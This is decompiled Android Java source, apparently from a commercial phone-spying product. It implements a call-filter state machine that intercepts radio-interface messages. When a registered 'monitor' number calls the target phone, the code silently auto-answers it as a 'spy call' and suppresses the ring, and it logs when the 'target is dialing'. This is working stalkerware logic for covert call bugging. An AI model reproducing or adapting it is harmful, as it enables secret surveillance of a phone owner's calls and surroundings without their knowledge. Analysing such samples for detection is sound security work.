package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Build;
import android.os.Parcel;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import com.vvt.e.b;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

 enum FilterGsmCall$CallState$1
{
  private byte[] cacheUnsolCallRing;
  private boolean isWaitingForResponse;
  private d monitorCallInfo;
  
  FilterGsmCall$CallState$1()
  {
    super(paramString, paramInt, null);
  }
  
  private FilterGsmCall.CallState a(d paramd)
  {
    Object localObject1 = null;
    boolean bool1 = true;
    Object localObject2 = FilterGsmCall.d(this.mFilterCall);
    Object localObject3 = paramd.d();
    localObject3 = ((f)localObject2).b((String)localObject3);
    boolean bool2;
    Object localObject4;
    boolean bool3;
    if (localObject3 != null)
    {
      bool2 = ((MonitorNumber)localObject3).isEnabled();
      if (bool2)
      {
        bool2 = bool1;
        if (!bool2) {
          break label421;
        }
        localObject2 = this.mFilterCall;
        localObject4 = "Found active monitor!";
        FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject4);
        localObject2 = FilterGsmCall.e(this.mFilterCall);
        bool3 = ((AudioManager)localObject2).isMusicActive();
        bool2 = ((MonitorNumber)localObject3).isSpyEnabled();
        if ((!bool2) || (bool3)) {
          break label218;
        }
        bool2 = bool1;
        label106:
        if (!bool2) {
          break label244;
        }
        localObject2 = this.mFilterCall;
        localObject3 = "Answer automatically";
        FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
        this.monitorCallInfo = paramd;
        bool2 = b.a();
        if (!bool2) {
          break label227;
        }
        bool2 = com.vvt.e.a.c();
        if (!bool2) {
          break label227;
        }
        bool2 = bool1;
        label156:
        if (!bool2) {
          break label236;
        }
        localObject2 = i.j;
        label166:
        localObject2 = i.a((byte[])localObject2);
        FilterGsmCall.c(this.mFilterCall).a((Parcel)localObject2);
        localObject1 = this.mFilterCall;
        ((FilterGsmCall)localObject1).d((Parcel)localObject2);
        this.isWaitingForResponse = bool1;
      }
    }
    for (localObject2 = IDLE;; localObject2 = RINGING)
    {
      return (FilterGsmCall.CallState)localObject2;
      bool2 = false;
      localObject2 = null;
      break;
      label218:
      bool2 = false;
      localObject2 = null;
      break label106;
      label227:
      bool2 = false;
      localObject2 = null;
      break label156;
      label236:
      localObject2 = i.i;
      break label166;
      label244:
      FilterGsmCall localFilterGsmCall = this.mFilterCall;
      String str = "%s -> Reject Spy Call";
      Object[] arrayOfObject = new Object[bool1];
      if (bool3)
      {
        localObject2 = "Music is playing";
        label269:
        arrayOfObject[0] = localObject2;
        localObject2 = String.format(str, arrayOfObject);
        FilterGsmCall.a(localFilterGsmCall, (String)localObject2);
        localObject2 = Build.MODEL;
        if (localObject2 == null) {
          break label413;
        }
        localObject2 = Build.MODEL;
        localObject1 = "LG";
        bool2 = ((String)localObject2).contains((CharSequence)localObject1);
        if (!bool2) {
          break label413;
        }
      }
      label413:
      for (localObject2 = i.f;; localObject2 = i.d)
      {
        localObject2 = i.a((byte[])localObject2);
        FilterGsmCall.c(this.mFilterCall).a((Parcel)localObject2);
        localObject1 = this.mFilterCall;
        ((FilterGsmCall)localObject1).d((Parcel)localObject2);
        if (bool3)
        {
          localObject2 = this.mFilterCall;
          localObject1 = new com/vvt/callmanager/ref/MonitorDisconnectData;
          localObject3 = ((MonitorNumber)localObject3).getPhoneNumber();
          localObject4 = MonitorDisconnectData.Reason.MUSIC_PLAY;
          ((MonitorDisconnectData)localObject1).<init>((String)localObject3, (MonitorDisconnectData.Reason)localObject4);
          FilterGsmCall.a((FilterGsmCall)localObject2, (MonitorDisconnectData)localObject1);
        }
        this.isWaitingForResponse = bool1;
        break;
        localObject2 = "Spy Call is disabled";
        break label269;
      }
      label421:
      FilterGsmCall.a(this.mFilterCall, "Forward ringing message");
      localObject2 = this.mFilterCall;
      byte[] arrayOfByte = this.cacheUnsolCallRing;
      i.a((n)localObject2, arrayOfByte);
    }
  }
  
  public void onEnter(Object paramObject)
  {
    BugEngineCallState localBugEngineCallState = null;
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    this.monitorCallInfo = null;
    this.cacheUnsolCallRing = null;
    bool = false;
    this.isWaitingForResponse = false;
    Object localObject = sNotifiedList;
    if (localObject == null)
    {
      localObject = new java/util/HashSet;
      ((HashSet)localObject).<init>();
      sNotifiedList = (Set)localObject;
    }
    for (;;)
    {
      FilterGsmCall.a(this.mFilterCall);
      localObject = this.mFilterCall;
      localBugEngineCallState = BugEngineCallState.GSM_IDLE;
      FilterGsmCall.a((FilterGsmCall)localObject, localBugEngineCallState);
      return;
      localObject = sNotifiedList;
      ((Set)localObject).clear();
    }
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.monitorCallInfo;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject1 = FilterGsmCall.c(this.mFilterCall);
    int j = ((m)localObject1).c(paramParcel);
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    boolean bool1 = FilterGsmCall.a(localFilterGsmCall, paramParcel, j);
    if (bool1)
    {
      FilterGsmCall.a(this.mFilterCall, "Got incoming call -> Ask for the phone number");
      localObject1 = paramParcel.marshall();
      this.cacheUnsolCallRing = ((byte[])localObject1);
      bool1 = false;
      localFilterGsmCall = null;
      localObject1 = this;
    }
    for (;;)
    {
      if (bool1)
      {
        localFilterGsmCall = this.mFilterCall;
        localFilterGsmCall.c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject1;
      int k = 1001;
      if (j == k)
      {
        localObject1 = FilterGsmCall.c(this.mFilterCall);
        localFilterGsmCall = this.mFilterCall;
        i.a((m)localObject1, localFilterGsmCall);
        k = 0;
        localFilterGsmCall = null;
        localObject1 = this;
      }
      else
      {
        boolean bool2 = this.isWaitingForResponse;
        if (bool2)
        {
          bool2 = i.a(j);
          if (bool2)
          {
            this.isWaitingForResponse = false;
            localObject1 = IDLE;
            bool2 = false;
            localFilterGsmCall = null;
            continue;
          }
        }
        bool2 = this.isWaitingForResponse;
        if (bool2)
        {
          m = 40;
          if (j == m)
          {
            this.isWaitingForResponse = false;
            localObject1 = SPYING;
            m = 0;
            localFilterGsmCall = null;
            continue;
          }
        }
        int m = 9;
        if (j == m)
        {
          localObject1 = l.a(paramParcel);
          j = ((l)localObject1).b;
          m = 134744072;
          if (j != m) {
            m = i;
          }
          for (;;)
          {
            localObject1 = d.a(paramParcel);
            Object localObject2 = "FilterCall";
            Object localObject3 = FilterGsmCall.c(this.mFilterCall).a();
            i.a((String)localObject2, (ArrayList)localObject1, (com.vvt.callmanager.mitm.a)localObject3);
            if (localObject1 == null) {
              break label380;
            }
            int n = ((ArrayList)localObject1).size();
            if (n != i) {
              break label380;
            }
            localObject1 = (d)((ArrayList)localObject1).get(0);
            if (localObject1 == null) {
              break label380;
            }
            n = ((d)localObject1).c();
            int i1 = 4;
            if (n != i1) {
              break label380;
            }
            localObject2 = this.mFilterCall;
            localObject3 = "Get calling from: %s";
            Object localObject4 = new Object[i];
            String str = ((d)localObject1).d();
            localObject4[0] = str;
            localObject4 = String.format((String)localObject3, (Object[])localObject4);
            FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject4);
            localObject1 = a((d)localObject1);
            break;
            m = 0;
            localFilterGsmCall = null;
          }
          label380:
          localObject1 = this;
        }
        else
        {
          m = i;
          localObject1 = this;
        }
      }
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    Object localObject = FilterGsmCall.c(this.mFilterCall);
    int i = ((m)localObject).b(paramParcel);
    int j = 10;
    if (i == j)
    {
      localObject = this.mFilterCall;
      String str = "Target is dialing";
      FilterGsmCall.a((FilterGsmCall)localObject, str);
    }
    for (localObject = DIALING;; localObject = this)
    {
      this.mFilterCall.d(paramParcel);
      return (FilterGsmCall.CallState)localObject;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */